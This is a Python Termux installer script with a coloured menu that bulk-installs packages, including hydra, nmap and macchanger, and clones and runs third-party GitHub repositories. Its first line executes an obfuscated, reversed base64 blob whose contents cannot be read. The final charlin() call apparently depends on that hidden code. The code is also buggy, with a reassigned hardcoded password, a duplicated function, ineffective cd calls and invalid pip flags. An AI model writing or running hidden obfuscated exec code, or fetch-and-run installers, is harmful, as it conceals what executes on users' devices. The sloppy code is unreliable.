##code
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlTYx4ETi1WOHZlM5QjVxMWMaRkSpd1V3pXWYp1cW1mRxJmRSpVZYRGdVJDcwImVkplWHhXahp3a3Z1akNkYtpkcRtmUhNWRaRXVrB3dXZEZ2cFVGpWVwoURZpmRTZVMKJ3YGRmWXZkSIZFbvhnUyYVVNdFdOR1aaVkVuJ1VWZkUzNWRklWTFlFeUVlT3ZlVWVzVWZlaW5GaIl1VotkUxolehRkRXRmVvhXVWp0ShxWTyMlaGhWYzIFWX5mRhJFbkFmWFpVYjRlRWl1ak9UZsZVeOVlVVFWMwJnVww2dSxmTzQFboVVZUJlVUZlVTJmRSdHVthnTNVUS6ZlVWtUTGp0TlVEZp5kasZlVtR3ciZFZ2UVVkR1VqZESZZVU4FGMxAlUtBnWSxmS0VlM0FmVWNWMaZkWpNmeWhlVuxmdNdkTXN2RxU1YUZlVWpmRWNlRap0TWR2ThZlWzZFRO9kYGpFUlZEZaZ1MCdlWGB3SSZEc2M1V450U6xGWW5WRxEmMGJnWFpFbTVFN4ZlaGJUYsZVNOVkVqlVVaFnVIJ0SiZlSLNmRohlTs9GeWdEbwIlMVl3TEJ0VlZUR3dVVaRjUxoEaaVkVs1ERCZUWuR2aNFjW5VVbxQVYrVTRZZFbrJFbaR0TXRnWkhUQ3plRJFjUyo0bUpmSoNVMZpnVWh2bl1mUYJlbwlWTxo0RZ1WO0YVMwh3Vsp1TXtWNxZleOdnUrFDUX5GcVZFbKRXVwUzVNdUSyI2R4lWYthWdW5GbWFmMK1EVqZEaPdlTwd1V5IXZWhmdaNDbaJ2Rol1VpNGcLFVP9ciYokyXogyYlhXZ'))
import os
import sys
import string
import time
from datetime import date
from datetime import datetime

def xox(z):
	for a in z + "":
		sys.stdout.write(a)
		sys.stdout.flush()
		time.sleep(0.1)
		
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'

W = '\033[1;47m'
R = '\033[1;41m'
G = '\033[1;42m'
Y = '\033[1;43m'
B = '\033[1;44m'
P = '\033[1;45m'
C = '\033[1;46m'

now = datetime.now()
dt_string = now.strftime("%H:%M")

def vody():
	os.system("clear")
	print(logo)
	print(bar)
	print("     \033[1;41mthis tools created by Rahova Charlin\033[0m")
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	print(bar)
	print(" \033[91;1m[1] \033[93;1mInstall All pkg")
	print(" \033[91;1m[2] \033[94;1mInstall Tool-X")
	print(" \033[91;1m[3] \033[95;1mInstall Banner")
	print(" \033[91;1m[0] \033[96;1mExit")
	print(bar)
	user=input(" \033[91;1m[√] \033[97;1mchoose : ")
	print(bar)
	time.sleep(2.0)
	if user in ["1", "01"]:
		pkg()
	if user in ["2", "02"]:
		tool()
	if user in ["3", "03"]:
		banner()
	if user in ["0", "00"]:
		os.system("clear")
		exit()
	else:
		vody()
		
		
logo=(""" \033[91;1m██████╗░░░█████╗░██╗░░██╗░█████╗░██╗░░██╗░█████╗
 \033[92;1m██╔══██╗░██╔══██╗██║░░██║██╔══██╗██║░░██║██╔══██╗
 \033[93;1m██████═╝░███████║███████║██║░░██║██║░░██║███████║
 \033[94;1m██╔══██╗░██╔══██║██╔══██║██║░░██║██║░░██║██╔══██║
 \033[95;1m██║░░╚██║██║░░██║██║░░██║╚█████╔╝╚█████╔╝██║░░██║
 \033[96;1m╚═╝░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝\033[1;97m""")
bar=("\033[97;1m================================================")

def pkg():
	os.system("clear")
	print(logo)
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	user1=input(" Press enter to install all package")
	os.system("clear")
	os.system("apt update -y")
	os.system("apt upgrade -y")
	os.system("pkg install python2 -y")
	os.system("pkg install python3 -y")
	os.system("pkg install python-pip -y")
	os.system("pkg install wget -y")
	os.system("pkg install fish -y")
	os.system("pkg install ruby -y")
	os.system("pkg install help -y")
	os.system("pkg install dnsutils -y")
	os.system("pkg install php -y")
	os.system("pkg install perl -y")
	os.system("pkg install lua -y")
	os.system("pkg install parallel -y")
	os.system("pkg install nmap -y")
	os.system("pkg install bash -y")
	os.system("pkg install clang -y")
	os.system("pkg install nano -y")
	os.system("pkg install w3m -y")
	os.system("pkg install hydra -y")
	os.system("pkg install figlet -y")
	os.system("pkg install cowsay -y")
	os.system("pkg install curl -y")
	os.system("pkg install tar -y")
	os.system("pkg install zip -y")
	os.system("pkg install unzip -y")
	os.system("pkg install net-tools -y")
	os.system("pkg install tor -y")
	os.system("pkg install sudo -y")
	os.system("pkg install wireshark -y")
	os.system("pkg install wgetrc -y")
	os.system("pkg install wcalc -y")
	os.system("pkg install openssl -y")
	os.system("clear")
	user=input(" Press enter to continues")
	os.system("pkg install openssl-tool -y")
	os.system("pkg install bmon -y")
	os.system("pkg install vpn -y")
	os.system("pkg install unrar -y")
	os.system("pkg install toilet -y")
	os.system("pkg install proot -y")
	os.system("pkg install net-tools -y")
	os.system("pkg install vim -y")
	os.system("pkg install vim-python -y")
	os.system("pkg install ired -y")
	os.system("pkg install goaccess -y")
	os.system("pkg install golang -y")
	os.system("pkg install tar -y") 
	os.system("pkg install kibi -y")
	os.system("pkg install tsu -y")
	os.system("pkg install tmux -y")
	os.system("pkg install mtools -y")
	os.system("pkg install file -y")
	os.system("pkg install vis -y")
	os.system("pkg install pass -y")
	os.system("pkg install pick -y")
	os.system("pkg install chroot -y")
	os.system("pkg install macchanger -y")
	os.system("clear")
	user=input(" Press enter to continues ")
	os.system("pkg install ninja -y")
	os.system("pkg install elixir -y")
	os.system("pkg install swift -y")
	os.system("pkg install xmlstarlet -y")
	os.system("pkg install fakeroot -y")
	os.system("pkg install texinfo -y")
	os.system("pkg install netcat -y")
	os.system("pkg install wren -y")
	os.system("pkg install gatling -y")
	os.system("pkg install cvs -y")
	os.system("pkg install ffmpeg -y")
	os.system("pkg install screen -y")
	os.system("pkg install neofetch -y")
	os.system("pkg install mariadb -y")
	os.system("pkg install picolisp -y")
	os.system("pkg install toilet -y")
	os.system("pkg install cmatrix -y")
	os.system("pkg install dropbear -y")
	os.system("pkg install openssh -y")
	os.system("pkg install python-pip -y")
	os.system("pip2 install wget -y")
	os.system("pip install bs4  -y")
	os.system("pip2 install bs4 -y")
	os.system("pip install requests -y")
	os.system("pip2 install requests -y")
	os.system("pip install mechanize -y")
	os.system("pip2 install mechanize -y")
	os.system("pip install php -y")
	os.system("pip2 install php -y")
	os.system("pkg install rich -y")
	os.system("pip install rich -y")
	os.system("pip2 install rich -y")
	os.system("clear")
	print("\033[92;1minstallation done...")
	time.sleep(2.0)
	vody()
	
def tool():
	os.system("clear")
	print(logo)
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	user=input(" Press enter to install tool-X")
	os.system("clear")
	os.system("git clone https://github.com/ekadanuarta/Tool-X.git")
	os.system("cd Tool-X")
	os.system("python install.py")
	
	
def banner():
	os.system("clear")
	print(logo)
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	user=input(" Press enter to install banner")
	os.system("clear")
	os.system("")
	os.system("git clone https://github.com/Bhai4You/Termux-Banner")
	os.system("cd Termux-Banner")
	os.system("bash -r requirement.sh")
	os.system("bash t-ban.sh")
	
	
def vody():
	os.system("clear")
	print(logo)
	print(bar)
	print("     \033[1;41mthis tools created by Rahova Charlin\033[0m")
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	print(bar)
	print(" \033[91;1m[1] \033[93;1mInstall All pkg")
	print(" \033[91;1m[2] \033[94;1mInstall Tool-X")
	print(" \033[91;1m[3] \033[95;1mInstall Banner")
	print(" \033[91;1m[0] \033[96;1mExit")
	print(bar)
	user=input(" \033[91;1m[√] \033[97;1mchoose : ")
	print(bar)
	time.sleep(2.0)
	if user in ["1", "01"]:
		pkg()
	if user in ["2", "02"]:
		tool()
	if user in ["3", "03"]:
		banner()
	if user in ["0", "00"]:
		os.system("clear")
		exit()
	else:
		vody()
username = "Rahovacharlin"
password = "Madagascar"	
os.system("clear")
user10=input(" \033[96;1mEnter username \033[97;1m: ")
user11=input(" \033[96;1mEnter password \033[97;1m: ")
username = "Rahovacharlin"

if user10 == "" :
	print(" invalide username ")
	exit()
elif user10 == username :
	print(" valide username ")
else:
	print(" invalide username")
	exit()
	
password = "Mada"	
if user11 == "" :
	print(" incorrect password ")
	exit()
elif user11 == password :
	print(" correct password ")
else:
	print(" incorrect password ")
	exit()
	
	
class Main():
	os.system("clear")
	print(logo)
	print(bar)
	xox("     \033[1;41mthis tools created by Rahova Charlin\033[0m")
	print("")
	print(bar)
	print(" \033[91;1m[•] \033[92;1mAUTHOR  : \033[92;1mRAHOVA CHARLIN")
	print(" \033[91;1m[•] \033[93;1mGITHUB  : \033[95;1mR4H0V4-CH4RL1N      \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[94;1mCOUNTRY : \033[94;1mMADAGASCAR          \033[92;1m&&& \033[96;1m" + dt_string +" \033[92;1m&&&")
	print(" \033[91;1m[•] \033[95;1mTOOLS   : \033[93;1mFREE                \033[92;1m&&&&&&&&&&&&&")
	print(" \033[91;1m[•] \033[96;1mVERSION : \033[92;1m2.0")
	print(bar)
	print(bar)
	print(" \033[91;1m[1] \033[93;1mInstall All pkg")
	print(" \033[91;1m[2] \033[94;1mInstall Tool-X")
	print(" \033[91;1m[3] \033[95;1mInstall Banner")
	print(" \033[91;1m[0] \033[96;1mExit")
	print(bar)
	user=input(" \033[91;1m[√] \033[97;1mchoose : ")
	print(bar)
	time.sleep(2.0)
	if user in ["1", "01"]:
		pkg()
	if user in ["2", "02"]:
		tool()
	if user in ["3", "03"]:
		banner()
	if user in ["0", "00"]:
		os.system("clear")
		exit()
	else:
		vody()
	






charlin()
